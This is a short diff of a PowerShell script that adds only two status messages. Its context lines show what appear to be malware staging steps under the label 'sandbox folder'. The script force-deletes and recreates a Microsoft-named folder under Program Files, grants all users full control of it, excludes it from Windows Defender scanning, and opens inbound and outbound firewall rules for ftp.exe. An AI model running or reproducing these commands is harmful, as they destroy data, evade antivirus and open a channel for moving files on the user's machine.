@@ -22,12 +22,14 @@ if(($privBack -eq $null) -or ($privRest -eq $null) -or ($privOwn -eq $null)) # C
 }
 else # Create sandbox folder
 {
+    echo "Creating environment";
     rm -r -fo "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue';
 
     md "C:\Program Files\Common Files\Microsoft" >$null;
     icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
     Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft' >$null;
-
+    
+    echo "Setting up Firewall";
     New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
     New-NetFirewallRule -DisplayName "FTP-out"  -Direction Outbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
 }
